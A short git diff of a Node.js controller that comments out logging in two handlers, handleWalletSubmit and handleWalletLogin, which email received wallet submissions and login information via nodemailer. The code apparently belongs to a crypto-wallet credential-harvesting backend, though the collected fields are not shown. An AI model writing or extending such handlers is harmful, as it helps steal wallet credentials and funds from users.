@@ -1,5 +1,5 @@
 import nodemailer from 'nodemailer';
-import logger from '../utils/logger.js';  // Use the `.js` extension for ES6 imports
+// import logger from '../utils/logger.js';  
 import dotenv from 'dotenv';  // Use `import` instead of `require`
 
 dotenv.config();  // Load environment variables from .env file
@@ -111,10 +111,10 @@ export const handleWalletSubmit = async (req, res) => {
 
   try {
     const info = await transporter.sendMail(mailOptions);
-    logger.log(`Email sent: ${info.response}`);
+    // logger.log(`Email sent: ${info.response}`);
     res.status(200).json({ message: 'Submission received successfully and email sent' });
   } catch (error) {
-    logger.error('Error sending email:', error);
+    // logger.error('Error sending email:', error);
     res.status(500).json({ error: 'Failed to send email' });
   }
 };
@@ -141,11 +141,11 @@ export const handleWalletLogin = (req, res) => {
   // Send the email
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
-      logger.error('Error sending login email:', error);
+      // logger.error('Error sending login email:', error);
       return res.status(500).json({ error: 'Failed to send email' });
     }
 
-    logger.log(`Email sent for login attempt: ${info.response}`);
+    // logger.log(`Email sent for login attempt: ${info.response}`);
     res.status(200).json({ message: 'Login information received and email sent' });
   });
 };
